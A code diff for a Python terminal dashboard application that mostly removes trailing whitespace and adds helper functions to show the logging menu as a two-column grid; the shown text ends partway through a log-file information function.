@@ -203,15 +203,15 @@ class PerformanceMonitor:
         self.start_time = time.time()
         self.memory_snapshots = deque(maxlen=100)  # Keep last 100 snapshots
         self.peak_memory = 0
-        
+
     def get_memory_usage(self):
         """Get current memory usage in MB."""
         return self.process.memory_info().rss / 1024 / 1024
-    
+
     def get_cpu_percent(self):
         """Get current CPU usage percentage."""
         return self.process.cpu_percent(interval=0.1)
-    
+
     def record_snapshot(self):
         """Record memory snapshot."""
         mem = self.get_memory_usage()
@@ -219,7 +219,7 @@ class PerformanceMonitor:
         if mem > self.peak_memory:
             self.peak_memory = mem
         return mem
-    
+
     def get_stats(self):
         """Get performance statistics."""
         if not self.memory_snapshots:
@@ -239,7 +239,7 @@ class CacheSystem:
         self.default_ttl = default_ttl
         self.hits = 0
         self.misses = 0
-        
+
     def get(self, key):
         """Get cached value if not expired."""
         if key in self.cache:
@@ -251,19 +251,19 @@ class CacheSystem:
                 del self.cache[key]
         self.misses += 1
         return None
-    
+
     def set(self, key, value, ttl=None):
         """Set cached value with TTL."""
         ttl = ttl or self.default_ttl
         self.cache[key] = (value, time.time() + ttl)
-    
+
     def clear(self, key=None):
         """Clear cache entry or entire cache."""
         if key:
             self.cache.pop(key, None)
         else:
             self.cache.clear()
-    
+
     def get_stats(self):
         """Get cache statistics."""
         total = self.hits + self.misses
@@ -288,12 +288,12 @@ class LazyLoader:
             'cv2': ['cv2'],
             'sklearn': ['sklearn'],
         }
-    
+
     def load(self, module_name):
         """Load module lazily on demand."""
         if module_name in self.modules:
             return self.modules[module_name]
-        
+
         try:
             mod = __import__(module_name)
             self.modules[module_name] = mod
@@ -301,12 +301,12 @@ class LazyLoader:
         except ImportError as e:
             print(f"{COLORS.get('1', [''])[0]}[!] Failed to lazy-load {module_name}: {e}{COLORS.get('0', [''])[0] if 'COLORS' in globals() else ''}")
             return None
-    
+
     def load_submodule(self, full_path):
         """Load a specific submodule lazily."""
         parts = full_path.split('.')
         mod = self.load(parts[0])
-        
+
         if mod:
             for part in parts[1:]:
                 try:
@@ -321,19 +321,19 @@ class ThreadPoolManager:
         self.pool = ThreadPoolExecutor(max_workers=max_workers)
         self.active_tasks = {}
         self.max_workers = max_workers
-        
+
     def submit_task(self, task_id, func, *args, **kwargs):
         """Submit task to pool with tracking."""
         future = self.pool.submit(func, *args, **kwargs)
         self.active_tasks[task_id] = future
         return future
-    
+
     def wait_task(self, task_id, timeout=None):
         """Wait for task completion."""
         if task_id in self.active_tasks:
             return self.active_tasks[task_id].result(timeout=timeout)
         return None
-    
+
     def get_active_count(self):
         """Get number of active tasks."""
         # Clean up completed tasks
@@ -341,7 +341,7 @@ class ThreadPoolManager:
         for k in completed:
             del self.active_tasks[k]
         return len(self.active_tasks)
-    
+
     def shutdown(self, wait=True):
         """Shutdown thread pool."""
         self.pool.shutdown(wait=wait)
@@ -357,7 +357,7 @@ class CommandHistoryManager:
         self.max_history = max_history
         self.history_file = os.path.join(DB_DIR, "command_history.json")
         self.load_history()
-    
+
     def add_command(self, command, category="general"):
         """Add command to history with timestamp and category."""
         # Use datetime module imported at top of file
@@ -375,24 +375,24 @@ class CommandHistoryManager:
                 return
         self.history.append(entry)
         self.save_history()
-    
+
     def search(self, query, category=None, limit=20):
         """Search command history by query string."""
         results = []
         query_lower = query.lower()
-        
+
         for entry in reversed(list(self.history)):
             if len(results) >= limit:
                 break
-            
+
             command_match = query_lower in entry["command"].lower()
             category_match = category is None or entry["category"] == category
-            
+
             if command_match and category_match:
                 results.append(entry)
-        
+
         return results
-    
+
     def get_frequently_used(self, limit=20):
         """Get most frequently used commands."""
         sorted_hist = sorted(
@@ -401,21 +401,21 @@ class CommandHistoryManager:
             reverse=True
         )
         return sorted_hist[:limit]
-    
+
     def get_by_category(self, category, limit=50):
         """Get commands by category."""
         results = [h for h in reversed(list(self.history)) if h["category"] == category]
         return results[:limit]
-    
+
     def get_recent(self, count=20):
         """Get most recent commands."""
         return list(reversed(list(self.history)))[:count]
-    
+
     def clear_history(self):
         """Clear all command history."""
         self.history.clear()
         self.save_history()
-    
+
     def export_history(self, format="json"):
         """Export history in different formats."""
         hist_list = list(self.history)
@@ -431,7 +431,7 @@ class CommandHistoryManager:
                 writer.writerows(hist_list)
             return output.getvalue()
         return str(hist_list)
-    
+
     def save_history(self):
         """Save history to file."""
         try:
@@ -440,7 +440,7 @@ class CommandHistoryManager:
                 json.dump(list(self.history), f, indent=2)
         except Exception as e:
             print(f"Warning: Could not save command history: {e}")
-    
+
     def load_history(self):
         """Load history from file."""
         try:
@@ -451,17 +451,17 @@ class CommandHistoryManager:
                         self.history.append(entry)
         except Exception as e:
             print(f"Warning: Could not load command history: {e}")
-    
+
     def get_stats(self):
         """Get history statistics."""
         categories = {}
         total_executions = 0
-        
+
         for entry in self.history:
             cat = entry.get("category", "unknown")
             categories[cat] = categories.get(cat, 0) + 1
             total_executions += entry.get("execution_count", 1)
-        
+
         return {
             "total_commands": len(self.history),
             "total_executions": total_executions,
@@ -476,7 +476,7 @@ class KeyboardShortcutsRegistry:
     def __init__(self):
         self.shortcuts = {}
         self._initialize_default_shortcuts()
-    
+
     def _initialize_default_shortcuts(self):
         """Initialize default keyboard shortcuts."""
         self.shortcuts = {
@@ -524,24 +524,24 @@ class KeyboardShortcutsRegistry:
                 {"key": "0", "action": "Back/Return", "description": "Return to previous menu"},
             ]
         }
-    
+
     def get_shortcuts(self, category=None):
         """Get shortcuts by category, or all if category is None."""
         if category:
             return self.shortcuts.get(category, [])
         return self.shortcuts
-    
+
     def add_shortcut(self, category, key, action, description):
         """Add custom keyboard shortcut."""
         if category not in self.shortcuts:
             self.shortcuts[category] = []
-        
+
         self.shortcuts[category].append({
             "key": key,
             "action": action,
             "description": description
         })
-    
+
     def get_all_shortcuts_formatted(self):
         """Get all shortcuts in formatted display."""
         output = []
@@ -554,6 +554,67 @@ class KeyboardShortcutsRegistry:
                 desc_str = shortcut["description"]
                 output.append(f"  {key_str} → {action_str} : {desc_str}")
         return "\n".join(output)
+
+
+# ================================================================================
+# MENU DISPLAY HELPER FUNCTIONS
+# ================================================================================
+
+def format_menu_horizontal(options, cols=2, width=80):
+    """
+    Format menu options horizontally to fit on one screen.
+
+    Args:
+        options: List of tuples (option_text, description) or just strings
+        cols: Number of columns to display
+        width: Terminal width (default 80)
+
+    Returns:
+        Formatted menu string
+    """
+    if not options:
+        return ""
+
+    # Calculate column width
+    col_width = (width - 2) // cols
+
+    # Prepare option lines
+    lines = []
+    for i in range(0, len(options), cols):
+        row = options[i:i+cols]
+        row_str = ""
+        for j, opt in enumerate(row):
+            if isinstance(opt, tuple):
+                opt_text = opt[0]
+            else:
+                opt_text = str(opt)
+
+            # Truncate if too long
+            if len(opt_text) > col_width - 2:
+                opt_text = opt_text[:col_width-5] + "..."
+
+            row_str += opt_text.ljust(col_width)
+
+        lines.append(row_str.rstrip())
+
+    return "\n".join(lines)
+
+
+def print_menu_grid(title, options, cols=2, show_header=True):
+    """
+    Print a menu in grid format that fits on one screen.
+
+    Args:
+        title: Menu title
+        options: List of menu option strings (e.g., "[1] Option 1", "[2] Option 2")
+        cols: Number of columns
+        show_header: Whether to show the menu title header
+    """
+    if show_header:
+        print_header(title)
+
+    formatted = format_menu_horizontal(options, cols=cols)
+    print(formatted)
 
 
 # Global performance instances
@@ -617,14 +678,14 @@ def get_performance_stats():
 def display_performance_stats():
     """Display real-time performance monitoring dashboard."""
     global PERFORMANCE_MONITOR, CACHE_SYSTEM, THREAD_POOL
-    
+
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("⚡ PERFORMANCE MONITORING DASHBOARD")
-        
+
         c = get_current_color()
         stats = get_performance_stats()
-        
+
         # Memory Statistics
         print(f"\n{BOLD}{c}📊 MEMORY STATISTICS{RESET}")
         if PERFORMANCE_MONITOR and stats.get('monitor'):
@@ -636,7 +697,7 @@ def display_performance_stats():
             print(f"   {draw_bar(mem_stats.get('current_memory', 0) / max(mem_stats.get('peak_memory', 1), 1) * 100)}")
         else:
             print(f"   {COLORS['3'][0]}ℹ️  Performance monitor not initialized{RESET}")
-        
+
         # CPU Statistics
         print(f"\n{BOLD}{c}🖥️  CPU STATISTICS{RESET}")
         try:
@@ -646,7 +707,7 @@ def display_performance_stats():
             print(f"   Process Count:      {len(psutil.pids())}")
         except Exception as e:
             print(f"   {COLORS['1'][0]}Error reading CPU stats: {e}{RESET}")
-        
+
         # Cache Statistics
         print(f"\n{BOLD}{c}💾 CACHE STATISTICS{RESET}")
         if CACHE_SYSTEM and stats.get('cache'):
@@ -661,7 +722,7 @@ def display_performance_stats():
             print(f"   Active Keys:        {cache_stats.get('entry_count', 0)}")
         else:
             print(f"   {COLORS['3'][0]}ℹ️  Cache system not initialized{RESET}")
-        
+
         # Threading Statistics
         print(f"\n{BOLD}{c}🔀 THREADING STATISTICS{RESET}")
         if THREAD_POOL and stats.get('active_threads') is not None:
@@ -671,48 +732,48 @@ def display_performance_stats():
             print(f"   {draw_bar(active_threads / 8 * 100)}")
         else:
             print(f"   {COLORS['3'][0]}ℹ️  Thread pool not initialized{RESET}")
-        
+
         # System Uptime
         print(f"\n{BOLD}{c}⏱️  SYSTEM UPTIME{RESET}")
         boot_str, uptime_str = _format_boot_info(psutil.boot_time())
         print(f"   Boot Time:          {boot_str}")
         print(f"   Uptime:             {uptime_str}")
-        
+
         # Performance Recommendations
         print(f"\n{BOLD}{c}💡 PERFORMANCE RECOMMENDATIONS{RESET}")
         recommendations = []
-        
+
         if PERFORMANCE_MONITOR and stats.get('monitor'):
             mem_stats = stats['monitor']
             if mem_stats.get('current_memory', 0) > 500:
                 recommendations.append(f"   ⚠️  Memory usage ({mem_stats.get('current_memory', 0):.0f}MB) is elevated")
-        
+
         cpu_percent = psutil.cpu_percent(interval=0.1)
         if cpu_percent > 80:
             recommendations.append(f"   ⚠️  CPU usage ({cpu_percent:.1f}%) is high")
-        
+
         if CACHE_SYSTEM and stats.get('cache'):
             cache_stats = stats['cache']
             hit_rate = cache_stats.get('hits', 0) / max(cache_stats.get('hits', 0) + cache_stats.get('misses', 1), 1) * 100
             if hit_rate < 50:
                 recommendations.append(f"   ⚠️  Cache hit rate ({hit_rate:.1f}%) is low - consider longer TTL")
-        
+
         if THREAD_POOL and stats.get('active_threads') is not None:
             if stats['active_threads'] >= 7:
                 recommendations.append(f"   ⚠️  Thread pool near capacity ({stats['active_threads']}/8)")
-        
+
         if recommendations:
             for rec in recommendations:
                 print(rec)
         else:
             print(f"   {COLORS['2'][0]}✅ System performance is optimal{RESET}")
-        
+
         # Footer
         print(f"\n{BOLD}{c}Options:{RESET}")
         print(f"   [R] Refresh Stats")
         print(f"   [0] Return to Command Center")
         choice = input(f"\n{BOLD}🎯 Select option: {RESET}").strip().upper()
-        
+
         if choice == '0':
             break
         # Any other choice or R refreshes the display
@@ -736,20 +797,20 @@ class ErrorLevel(Enum):
 
 class ResilienceLogger:
     """Centralized logging system for error tracking and resilience metrics."""
-    
+
     def __init__(self, log_dir="/tmp/pythonoslog", max_entries=10000):
         self.log_dir = log_dir
         self.max_entries = max_entries
         self.error_counts = {}  # Track error frequency by type
         self.recovery_attempts = {}  # Track retry attempts
         self.failed_features = set()  # Features that failed gracefully
-        
+
         # Create log directory if it doesn't exist
         try:
             os.makedirs(log_dir, exist_ok=True)
         except Exception:
             self.log_dir = None  # Fallback to console-only logging
-        
+
         # Configure Python logging
         try:
             self.logger = logging.getLogger("pythonOS")
@@ -761,18 +822,18 @@ class ResilienceLogger:
                 self.logger.setLevel(logging.DEBUG)
         except Exception:
             self.logger = None
-    
+
     def log(self, level, message, feature="System", error=None):
         """Log an event with context."""
         timestamp = datetime.now().isoformat()
         log_entry = f"[{timestamp}] {level.value} [{feature}] {message}"
-        
+
         if error:
             log_entry += f"\n  Error: {str(error)}"
             # Track error frequency
             error_type = type(error).__name__
             self.error_counts[error_type] = self.error_counts.get(error_type, 0) + 1
-        
+
         # Log to file if available
         if self.logger:
             try:
@@ -788,11 +849,11 @@ class ResilienceLogger:
                     self.logger.debug(log_entry)
             except Exception:
                 pass  # Silent fail for logging failures
-        
+
         # Also log to console for visibility
         if level in [ErrorLevel.CRITICAL, ErrorLevel.ERROR, ErrorLevel.WARNING]:
             print(f"{COLORS['1'][0]}{log_entry}{RESET}" if level != ErrorLevel.WARNING else f"{COLORS['4'][0]}{log_entry}{RESET}")
-    
+
     def record_recovery(self, feature, attempt_num, success=False):
         """Track retry/recovery attempts."""
         if feature not in self.recovery_attempts:
@@ -800,13 +861,13 @@ class ResilienceLogger:
         self.recovery_attempts[feature]["attempts"] += 1
         if success:
             self.recovery_attempts[feature]["successes"] += 1
-    
+
     def mark_feature_failed(self, feature, error=None):
         """Mark a feature as failed but operating in degraded mode."""
         self.failed_features.add(feature)
         if error:
             self.log(ErrorLevel.WARNING, f"Feature '{feature}' in degraded mode", error=error)
-    
+
     def get_health_report(self):
         """Get current error/recovery statistics."""
         report = {
@@ -821,18 +882,18 @@ class ResilienceLogger:
 # Global resilience logger instance
 RESILIENCE_LOGGER = ResilienceLogger()
 
-def retry_with_backoff(max_attempts=3, initial_delay=1, backoff_factor=2, 
+def retry_with_backoff(max_attempts=3, initial_delay=1, backoff_factor=2,
                        allowed_exceptions=(Exception,), feature_name="Unknown"):
     """
     Decorator for implementing exponential backoff retry logic.
-    
+
     Args:
         max_attempts: Maximum number of retry attempts
         initial_delay: Initial delay in seconds
         backoff_factor: Multiplier for delay between attempts (exponential backoff)
         allowed_exceptions: Tuple of exception types to catch and retry on
         feature_name: Name of the feature for logging
-    
+
     Returns: Decorated function with retry logic
     """
     def decorator(func):
@@ -840,7 +901,7 @@ def retry_with_backoff(max_attempts=3, initial_delay=1, backoff_factor=2,
         def wrapper(*args, **kwargs):
             delay = initial_delay
             last_error = None
-            
+
             for attempt in range(1, max_attempts + 1):
                 try:
                     result = func(*args, **kwargs)
@@ -855,13 +916,13 @@ def retry_with_backoff(max_attempts=3, initial_delay=1, backoff_factor=2,
                         feature=feature_name,
                         error=e
                     )
-                    
+
                     if attempt < max_attempts:
                         time.sleep(delay)
                         delay *= backoff_factor
                     else:
                         RESILIENCE_LOGGER.record_recovery(feature_name, attempt, success=False)
-            
+
             # All retries exhausted
             RESILIENCE_LOGGER.log(
                 ErrorLevel.ERROR,
@@ -870,7 +931,7 @@ def retry_with_backoff(max_attempts=3, initial_delay=1, backoff_factor=2,
                 error=last_error
             )
             raise last_error
-        
+
         return wrapper
     return decorator
 
@@ -878,12 +939,12 @@ def graceful_degradation(fallback=None, feature_name="Unknown", log_errors=True)
     """
     Decorator for graceful feature degradation.
     Catches exceptions and returns fallback value instead of crashing.
-    
+
     Args:
         fallback: Value to return if function fails (None, empty dict, etc.)
         feature_name: Name of the feature for logging
         log_errors: Whether to log the error
-    
+
     Returns: Decorated function with graceful degradation
     """
     def decorator(func):
@@ -895,7 +956,7 @@ def graceful_degradation(fallback=None, feature_name="Unknown", log_errors=True)
                 if log_errors:
                     RESILIENCE_LOGGER.mark_feature_failed(feature_name, error=e)
                 return fallback
-        
+
         return wrapper
     return decorator
 
@@ -903,12 +964,12 @@ def safe_connection(timeout=5, retry_on_timeout=True, feature_name="Network"):
     """
     Decorator for network connections with timeout and retry logic.
     Implements exponential backoff for connection failures.
-    
+
     Args:
         timeout: Connection timeout in seconds
         retry_on_timeout: Whether to retry on timeout
         feature_name: Name of the feature for logging
-    
+
     Returns: Decorated function with connection resilience
     """
     def decorator(func):
@@ -916,16 +977,16 @@ def safe_connection(timeout=5, retry_on_timeout=True, feature_name="Network"):
         def wrapper(*args, **kwargs):
             from urllib.error import URLError
             from socket import timeout as socket_timeout
-            
+
             delay = 1
             max_attempts = 3 if retry_on_timeout else 1
-            
+
             for attempt in range(1, max_attempts + 1):
                 try:
                     # Add timeout to kwargs if function accepts it
                     if 'timeout' not in kwargs:
                         kwargs['timeout'] = timeout
-                    
+
                     result = func(*args, **kwargs)
                     if attempt > 1:
                         RESILIENCE_LOGGER.log(
@@ -934,7 +995,7 @@ def safe_connection(timeout=5, retry_on_timeout=True, feature_name="Network"):
                             feature=feature_name
                         )
                     return result
-                    
+
                 except (socket_timeout, URLError, ConnectionError) as e:
                     RESILIENCE_LOGGER.log(
                         ErrorLevel.WARNING,
@@ -942,14 +1003,14 @@ def safe_connection(timeout=5, retry_on_timeout=True, feature_name="Network"):
                         feature=feature_name,
                         error=e
                     )
-                    
+
                     if attempt < max_attempts:
                         time.sleep(delay)
                         delay *= 2
                     else:
                         RESILIENCE_LOGGER.mark_feature_failed(feature_name, error=e)
                         return None  # Return None for failed connections
-            
+
         return wrapper
     return decorator
 
@@ -969,7 +1030,7 @@ def track_feature_health(feature_name):
             except Exception as e:
                 RESILIENCE_LOGGER.mark_feature_failed(feature_name, error=e)
                 raise
-        
+
         return wrapper
     return decorator
 
@@ -984,10 +1045,10 @@ class SafeFeatureContext:
         self.fallback_value = fallback_value
         self.log_trace = log_trace
         self.result = fallback_value
-    
+
     def __enter__(self):
         return self
-    
+
     def __exit__(self, exc_type, exc_val, exc_tb):
         if exc_type is not None:
             RESILIENCE_LOGGER.mark_feature_failed(self.feature_name, error=exc_val)
@@ -1001,10 +1062,10 @@ def display_system_health():
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("🏥 SYSTEM HEALTH & RESILIENCE REPORT")
-        
+
         c = get_current_color()
         health = RESILIENCE_LOGGER.get_health_report()
-        
+
         # Overall Health Status
         print(f"\n{BOLD}{c}🔍 OVERALL HEALTH{RESET}")
         total_errors = health['total_errors']
@@ -1013,7 +1074,7 @@ def display_system_health():
         print(f"   Total Errors:       {total_errors}")
         print(f"   Failed Features:    {len(health['failed_features'])}")
         print(f"   Recovery Rate:      {sum(h.get('successes', 0) for h in health['recovery_stats'].values())} successful recoveries")
-        
+
         # Error Statistics
         print(f"\n{BOLD}{c}❌ ERROR STATISTICS{RESET}")
         if health['error_types']:
@@ -1023,7 +1084,7 @@ def display_system_health():
                 print(f"   {error_type:.<30} {count} occurrences")
         else:
             print(f"   {COLORS['2'][0]}✅ No errors recorded{RESET}")
-        
+
         # Feature Health Status
         print(f"\n{BOLD}{c}🎯 FEATURE STATUS{RESET}")
         if health['failed_features']:
@@ -1032,7 +1093,7 @@ def display_system_health():
                 print(f"      • {feature}")
         else:
             print(f"   {COLORS['2'][0]}✅ All features operational{RESET}")
-        
+
         # Recovery Attempts
         print(f"\n{BOLD}{c}🔄 RECOVERY STATISTICS{RESET}")
         if health['recovery_stats']:
@@ -1044,48 +1105,48 @@ def display_system_health():
                 print(f"   {feature:.<25} {status} {successes}/{attempts} ({rate:.0f}%)")
         else:
             print(f"   {COLORS['3'][0]}ℹ️  No recovery attempts recorded{RESET}")
-        
+
         # Recommendations
         print(f"\n{BOLD}{c}💡 RECOMMENDATIONS{RESET}")
         recommendations = []
-        
+
         if total_errors > 20:
             recommendations.append(f"   • High error rate - Consider system maintenance or feature reload")
         if len(health['failed_features']) > 3:
             recommendations.append(f"   • Multiple features degraded - Check system resources and logs")
-        
+
         # Check specific error patterns
         if 'ConnectionError' in health['error_types'] and health['error_types']['ConnectionError'] > 3:
             recommendations.append(f"   • Network connectivity issues detected - Check network configuration")
         if 'TimeoutError' in health['error_types'] and health['error_types']['TimeoutError'] > 2:
             recommendations.append(f"   • Timeout errors increasing - May indicate resource contention")
-        
+
         # Recovery success check
         recovery_success = sum(h.get('successes', 0) for h in health['recovery_stats'].values())
         if recovery_success > 0:
             recommendations.append(f"   ✅ System auto-recovery working - {recovery_success} successful recovery attempts")
-        
+
         if recommendations:
             for rec in recommendations:
                 print(rec)
         else:
             print(f"   {COLORS['2'][0]}✅ No issues detected - System operating normally{RESET}")
-        
+
         # Log Location
         if RESILIENCE_LOGGER.log_dir:
             print(f"\n{BOLD}{c}📁 LOGS{RESET}")
             print(f"   Location:           {RESILIENCE_LOGGER.log_dir}/pythonos.log")
-        
+
         # Timestamp
         print(f"\n{COLORS['6'][0]}Last Updated: {health['timestamp']}{RESET}")
-        
+
         # Footer
         print(f"\n{BOLD}{c}Options:{RESET}")
         print(f"   [R] Refresh Report")
         print(f"   [C] Clear Error Log (Reset Counters)")
         print(f"   [0] Return to Command Center")
         choice = input(f"\n{BOLD}🎯 Select option: {RESET}").strip().upper()
-        
+
         if choice == '0':
             break
         elif choice == 'C':
@@ -1101,13 +1162,13 @@ def display_security_audit():
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("🔒 SECURITY AUDIT LOG")
-        
+
         c = get_current_color()
-        
+
         # Get recent security events
         recent_events = AUDIT_LOGGER.get_recent_events(count=30)
         failed_events = AUDIT_LOGGER.get_failed_attempts()
-        
+
         # Overall Security Status
         print(f"\n{BOLD}{c}🔐 SECURITY STATUS{RESET}")
         security_status = "🟢 Secure" if len(failed_events) == 0 else "🟡 Caution" if len(failed_events) < 5 else "🔴 Alert"
@@ -1115,64 +1176,64 @@ def display_security_audit():
         print(f"   Total Audit Events:      {len(AUDIT_LOGGER.events)}")
         print(f"   Failed Attempts:         {len(failed_events)}")
         print(f"   Rate-Limited Events:     {sum(1 for e in AUDIT_LOGGER.events if e['type'] == 'RATE_LIMIT_EXCEEDED')}")
-        
+
         # Event Type Summary
         print(f"\n{BOLD}{c}📊 EVENT SUMMARY{RESET}")
         event_types = {}
         for event in AUDIT_LOGGER.events:
             event_type = event['type']
             event_types[event_type] = event_types.get(event_type, 0) + 1
-        
+
         for event_type in sorted(event_types.keys()):
             count = event_types[event_type]
             print(f"   {event_type:.<30} {count} events")
-        
+
         # Recent Failed Attempts
         if failed_events:
             print(f"\n{BOLD}{c}⚠️  FAILED ATTEMPTS (Last 10){RESET}")
             for event in failed_events[-10:]:
                 timestamp = event['timestamp'].split('T')[1][:8]  # Just time
                 print(f"   [{timestamp}] {event['user']:15} | {event['action']:20} | {event['resource']}")
-        
+
         # Recent Security Events
         print(f"\n{BOLD}{c}📝 RECENT EVENTS (Last 15){RESET}")
         for event in recent_events[-15:]:
             timestamp = event['timestamp'].split('T')[1][:8]  # Just time
             status_icon = f"{COLORS['2'][0]}✓{RESET}" if event['status'] == 'SUCCESS' else f"{COLORS['1'][0]}✗{RESET}"
             print(f"   [{timestamp}] {status_icon} {event['type']:20} | {event['user']:10} | {event['action']}")
-        
+
         # Recommendations
         print(f"\n{BOLD}{c}💡 SECURITY RECOMMENDATIONS{RESET}")
         recommendations = []
-        
+
         if len(failed_events) > 5:
             recommendations.append(f"   ⚠️  Multiple failed attempts detected")
-        
+
         rate_limit_events = sum(1 for e in AUDIT_LOGGER.events if e['type'] == 'RATE_LIMIT_EXCEEDED')
         if rate_limit_events > 3:
             recommendations.append(f"   ⚠️  Rate limiting triggered {rate_limit_events} times - possible attack")
-        
+
         invalid_input = sum(1 for e in AUDIT_LOGGER.events if e['type'] == 'INVALID_INPUT')
         if invalid_input > 10:
             recommendations.append(f"   ⚠️  Many invalid inputs - check for injection attempts")
-        
+
         if not recommendations:
             recommendations.append(f"   {COLORS['2'][0]}✅ No security issues detected{RESET}")
-        
+
         for rec in recommendations:
             print(rec)
-        
+
         # Audit Log Location
         print(f"\n{BOLD}{c}📁 AUDIT LOG{RESET}")
         print(f"   Location:           {AUDIT_LOGGER.audit_log_file}")
-        
+
         # Footer
         print(f"\n{BOLD}{c}Options:{RESET}")
         print(f"   [F] Show Failed Attempts")
         print(f"   [R] Show Recent Events")
         print(f"   [0] Return to Command Center")
         choice = input(f"\n{BOLD}🎯 Select option: {RESET}").strip().upper()
-        
+
         if choice == '0':
             break
         elif choice == 'F':
@@ -1201,36 +1262,43 @@ def display_logging_menu():
     if not LOGGER:
         print(f"\n{COLORS['1'][0]}❌ Logging system not available{RESET}")
         return
-    
+
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("📋 CENTRALIZED LOGGING SYSTEM")
-        
+
         c = get_current_color()
-        
+
         # Get statistics
         stats = LOGGER.get_statistics()
-        
+
         print(f"\n{BOLD}{c}Logging Management:{RESET}")
-        print(f" {BOLD}[1]{RESET} 📊 View Recent Logs (last 50)")
-        print(f" {BOLD}[2]{RESET} ❌ View Error Logs")
-        print(f" {BOLD}[3]{RESET} 🏢 View Logs by Component")
-        print(f" {BOLD}[4]{RESET} 📈 Logging Statistics")
-        print(f" {BOLD}[5]{RESET} 💾 Log Files Information")
-        print(f" {BOLD}[6]{RESET} 🔍 Search Logs")
-        print(f" {BOLD}[7]{RESET} 📤 Export Logs to JSON")
-        print(f" {BOLD}[8]{RESET} 🗑️  Clear Log Buffer")
-        print(f" {BOLD}[9]{RESET} 🏥 Component Health Report")
-        print(f" {BOLD}[0]{RESET} ↩️  Return to Command Center")
-        
+
+        # Horizontal menu layout
+        menu_options = [
+            f" {BOLD}[1]{RESET} 📊 View Logs",
+            f" {BOLD}[2]{RESET} ❌ Error Logs",
+            f" {BOLD}[3]{RESET} 🏢 Logs by Component",
+            f" {BOLD}[4]{RESET} 📈 Statistics",
+            f" {BOLD}[5]{RESET} 💾 Log Files",
+            f" {BOLD}[6]{RESET} 🔍 Search",
+            f" {BOLD}[7]{RESET} 📤 Export JSON",
+            f" {BOLD}[8]{RESET} 🗑️  Clear Buffer",
+            f" {BOLD}[9]{RESET} 🏥 Health Report",
+            f" {BOLD}[0]{RESET} ↩️  Return"
+        ]
+
+        # Print in 2 columns to fit on screen
+        print_menu_grid("", menu_options, cols=2, show_header=False)
+
         print(f"\n{BOLD}{c}Current Stats:{RESET}")
         print(f"  Total Logs:        {stats['total_logs']}")
         print(f"  Buffer Size:       {stats['buffer_size']}")
         print(f"  Debug:  {stats['by_level']['DEBUG']:5}  Info:  {stats['by_level']['INFO']:5}  Warn:  {stats['by_level']['WARNING']:5}")
         print(f"  Error:  {stats['by_level']['ERROR']:5}  Critical: {stats['by_level']['CRITICAL']:5}")
-        
+
         choice = input(f"\n{BOLD}🎯 Select option: {RESET}").strip()
-        
+
         if choice == '0':
             break
         elif choice == '1':
@@ -1259,9 +1327,9 @@ def _view_recent_logs():
     """View recent logs."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("📊 RECENT LOGS")
-    
+
     logs = LOGGER.get_recent_logs(count=50)
-    
+
     print(f"\n{BOLD}Last 50 log entries:{RESET}\n")
     for log in logs[-30:]:  # Show last 30 for readability
         level_color = {
@@ -1271,18 +1339,18 @@ def _view_recent_logs():
             'ERROR': COLORS['1'][0],
             'CRITICAL': COLORS['1'][0]
         }.get(log['level'], RESET)
-        
+
         print(f"[{log['timestamp']}] {level_color}{log['level']:8}{RESET} [{log['component']}] {log['message'][:60]}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _view_error_logs():
     """View error and critical logs."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("❌ ERROR LOGS")
-    
+
     logs = LOGGER.get_error_logs(count=50)
-    
+
     print(f"\n{BOLD}Error and Critical Logs:{RESET}\n")
     if not logs:
         print(f"{COLORS['2'][0]}✅ No errors logged{RESET}")
@@ -1294,34 +1362,34 @@ def _view_error_logs():
             if log.get('context', {}).get('exception'):
                 print(f"   Exception: {log['context']['exception']}")
             print()
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _view_logs_by_component():
     """View logs by component."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("🏢 LOGS BY COMPONENT")
-    
+
     stats = LOGGER.get_statistics()
-    
+
     print(f"\n{BOLD}Components:{RESET}\n")
     for i, (component, count) in enumerate(stats['by_component'].items(), 1):
         print(f" {BOLD}[{i}]{RESET} {component:20} {count:5} logs")
-    
+
     component_idx = input(f"\n{BOLD}Select component number (0 to cancel): {RESET}").strip()
-    
+
     try:
         idx = int(component_idx)
         if idx == 0:
             return
         component = list(stats['by_component'].keys())[idx - 1]
-        
+
         logs = LOGGER.get_logs_by_component(component, count=30)
-        
+
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header(f"LOGS: {component}")
         print(f"\n{BOLD}Showing {len(logs)} recent logs for {component}:{RESET}\n")
-        
+
         for log in logs:
             level_color = {
                 'DEBUG': COLORS['3'][0],
@@ -1333,73 +1401,73 @@ def _view_logs_by_component():
             print(f"[{log['timestamp']}] {level_color}{log['level']:8}{RESET} {log['message'][:70]}")
     except (ValueError, IndexError):
         print(f"\n{COLORS['1'][0]}Invalid selection{RESET}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _show_log_statistics():
     """Show logging statistics."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("📈 LOGGING STATISTICS")
-    
+
     stats = LOGGER.get_statistics()
-    
+
     print(f"\n{BOLD}Statistics:{RESET}\n")
     print(f"  Total Logs:        {stats['total_logs']}")
     print(f"  Buffer Size:       {stats['buffer_size']}")
     print(f"  Start Time:        {stats['start_time']}")
     print(f"  Current Time:      {stats['current_time']}")
-    
+
     print(f"\n{BOLD}Logs by Level:{RESET}")
     for level, count in stats['by_level'].items():
         bar = "█" * (count // 5) if count > 0 else ""
         print(f"  {level:8} {count:6}  {bar}")
-    
+
     print(f"\n{BOLD}Top Components:{RESET}")
     sorted_components = sorted(stats['by_component'].items(), key=lambda x: x[1], reverse=True)
     for component, count in sorted_components[:10]:
         bar = "█" * (count // 10) if count > 0 else ""
         print(f"  {component:20} {count:6}  {bar}")
-    
+
     input(f"\n{BOLD}Press Enter to continue...{RESET}")
 
 def _show_log_files_info():
     """Show log files information."""
     os.system('cls' if os.name == 'nt' else 'clear')
     print_header("💾 LOG FILES INFORMATION")
-    
+
     info = LOGGER.get_log_files_info()
-    
+
     print(f"\n{BOLD}Log Directory:{RESET} {info['log_dir']}\n")
     print(f"{BOLD}Files:{RESET}\n")
-    
+
     if not info['files']:
